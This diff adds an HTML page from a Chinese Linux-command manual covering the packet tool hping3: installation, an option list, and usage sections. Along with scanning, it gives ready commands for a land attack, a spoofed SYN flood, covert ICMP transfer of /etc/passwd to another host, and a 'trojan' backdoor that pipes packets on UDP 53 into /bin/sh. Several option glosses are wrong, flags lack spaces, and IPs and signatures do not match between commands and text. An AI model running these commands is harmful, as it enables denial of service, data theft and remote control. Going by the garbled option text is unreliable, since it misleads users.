@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <title>hping3:测试网络及主机的安全</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="keywords" content="dev-coco, Linux命令手册, Linux命令"/>
+    <meta name="robots" content="index,follow"/>
+    <meta name="description" content="hping3:测试网络及主机的安全 — 最专业的Linux命令大全"/>
+    <link rel="icon" href="https://dev-coco.github.io/images/WebIcon.png">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <script src="https://dev-coco.github.io/js/love.js" async="async"></script>
+    <style>img{width:58px;}div.menu{background-color:#f5f5f5;}div.menu a{display:inline-block;color:black;text-align:center;padding:14px;text-decoration:none;}div.menu a:hover{background-color:#777;}p,li,td{font-size: 16pt;font-family: arial, helvetica, sans-serif;}pre{background-color:#eee}.img{border-radius: 10px;display: block;margin-left: auto;margin-right: auto;width: 50%;text-align: center;}h1,h2,h3{text-align:center}</style>
+</head>
+<body>
+    <div class="container">
+<h1 style="text-align:left;"><img alt="dev-coco" src="https://dev-coco.github.io/images/WebIcon.png"> Dev-Coco</h1>
+<div class="menu">
+  <a href="https://dev-coco.github.io/">主页</a>
+  <a href="https://dev-coco.github.io/blog">博客</a>
+  <a href="https://dev-coco.github.io/Featured-Software.html">软件</a>
+  <a href="https://dev-coco.github.io/Online-Tools/">在线工具</a>
+  <a href="https://dev-coco.github.io/Linux-Command/">Linux命令</a>
+  <a target="_blank" href="https://github.com/dev-coco">Github</a>
+</div>
+<h1>hping3</h1><p>测试网络及主机的安全</p>
+<h2>补充说明</h2><p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>
+<h3>安装</h3><pre><code>yum <span>install</span> libpcap-devel tc-devel
+<span>ln</span> -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
+<span>wget</span> http://www.hping.org/hping3-20051105.tar.gz
+<span>tar</span> zxvf hping3-20051105.tar.gz
+<span>cd</span> hping3-20051105
+./configure
+<span>make</span>
+<span>make</span> <span>install</span></code></pre>
+<h3>选项</h3><pre><code>-H --help 显示帮助。
+-v -VERSION 版本信息。
+-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
+-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
+-n -nmeric 数字输出，象征性输出主机地址。
+-q -quiet 退出。
+-I --interface interface name 无非就是eth0之类的参数。
+-v --verbose 显示很多信息，TCP回应一般如：len<span>=</span><span>46</span> <span>ip</span><span>=</span><span>192.168</span>.1.1 <span>flags</span><span>=</span>RADF <span>seq</span><span>=</span><span>0</span> <span>ttl</span><span>=</span><span>255</span> <span>id</span><span>=</span><span>0</span> <span>win</span><span>=</span><span>0</span> <span>rtt</span><span>=</span><span>0</span>.4ms <span>tos</span><span>=</span><span>0</span> <span>iplen</span><span>=</span><span>40</span> <span>seq</span><span>=</span><span>0</span> <span>ack</span><span>=</span><span>1380893504</span> <span>sum</span><span>=</span><span>2010</span> <span>urp</span><span>=</span><span>0</span>
+-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,<span>..</span><span>..</span><span>..</span>.）
+-z --bind 快捷键的使用。
+-Z --unbind 消除快捷键。
+-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
+-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
+-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
+-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
+-a --spoof <span>hostname</span> 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
+-t --ttl <span>time</span> to live 可以指定发出包的TTL值。
+-H --ipproto 在RAW IP模式里选择IP协议。
+-w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
+-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
+-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
+-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
+-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU <span>PATH</span> DISCOVERY。
+-G --fragoff fragment offset value <span>set</span> the fragment offset
+-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
+-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
+-C --ICMPTYPE <span>type</span> 指定ICMP类型，缺省是ICMP <span>echo</span> REQUEST。
+-K --ICMPCODE CODE 指定ICMP代号，缺省0。
+--icmp-ipver 把IP版本也插入IP头。
+--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
+--icmp-iplen 设置IP包长度。
+--icmp-ipid 设置ICMP报文IP头的ID，缺省是<span>RANDOM</span>。
+--icmp-ipproto 设置协议的，缺省是TCP。
+-icmp-cksum 设置校验和。
+-icmp-ts <span>alias</span> <span>for</span> --icmptype <span>13</span> <span>(</span>to send ICMP timestamp requests<span>)</span>
+--icmp-addr Alias <span>for</span> --icmptype <span>17</span> <span>(</span>to send ICMP address mask requests<span>)</span>
+-s --baseport <span>source</span> port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
+-p --deskport <span>[</span>+<span>]</span><span>[</span>+<span>]</span>desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
+--keep 上面说过了。
+-w --win 发的大小和windows一样大，64BYTE。
+-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / <span>4</span>.
+-m --tcpseq 设置TCP序列数。
+-l --tcpck 设置TCP ack。
+-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。</code></pre>
+<h3>Hping3功能</h3><p>Hping3主要有以下典型功能应用：</p>
+<h3>#  防火墙测试</h3><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。
+<p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>
+<pre><code>hping3 -S  -c <span>1000000</span> -a <span>10.10</span>.10.10 -p <span>21</span> <span>10.10</span>.10.10</code></pre>
+<h3># 端口扫描</h3><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>
+<pre><code>hping3 -I eth0  -S <span>192.168</span>.10.1 -p <span>80</span></code></pre>
+<p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>
+<p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>
+<h3># Idle扫描</h3><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>
+<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>
+<h3># 拒绝服务攻击</h3><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>
+<pre><code>hping3 -I eth0 -a192.168.10.99 -S <span>192.168</span>.10.33 -p <span>80</span> -i u1000</code></pre>
+<p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>
+<h3># 文件传输</h3><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
+<pre><code>hping3 <span>192.168</span>.1.159--listen signature --safe  --icmp</code></pre>
+<p>监听ICMP包中的签名，根据签名解析出文件内容。</p>
+<p>在发送端使用签名打包的ICMP包发送文件：</p>
+<pre><code>hping3 <span>192.168</span>.1.108--icmp ?d <span>100</span> --sign signature --file /etc/passwd</code></pre>
+<p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
+<h3># 木马功能</h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
+<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
+<p>在木马启动端：</p>
+<pre><code>hping3 <span>192.168</span>.10.66--listen signature --safe --udp -p <span>53</span> <span>|</span> /bin/sh</code></pre>
+<p>在远程控制端：</p>
+<pre><code><span>echo</span> <span>ls</span> <span>></span>test.cmd
+hping3 <span>192.168</span>.10.44 -p53 -d <span>100</span> --udp --sign siganature --file ./test.cmd</code></pre>
+<p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
+<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
+<p style="text-align:right"><a href="https://dev-coco.github.io/Linux-Command/"><img alt="Linux命令, Linux命令手册" src="https://dev-coco.github.io/images/Linux-Penguin-Icon.png" style="width:48px" />Linux命令手册</a></p>
+        </div>
+</body>
+</html>
